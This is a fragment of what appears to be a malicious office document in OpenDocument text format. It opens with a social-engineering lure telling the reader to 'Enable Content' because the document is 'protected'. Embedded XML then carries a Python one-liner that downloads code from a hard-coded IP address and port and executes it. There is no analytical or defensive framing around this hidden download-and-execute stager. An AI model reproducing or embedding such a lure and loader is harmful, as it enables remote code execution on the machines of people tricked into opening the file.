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Contents of this document are protected. Please click Enable Content to continue.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Standard"/></office:text>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python -c ""import urllib2; r = urllib2.urlopen('http://192.168.68.8:8080/EPgrIKIX3XKhOpt'); exec(r.read(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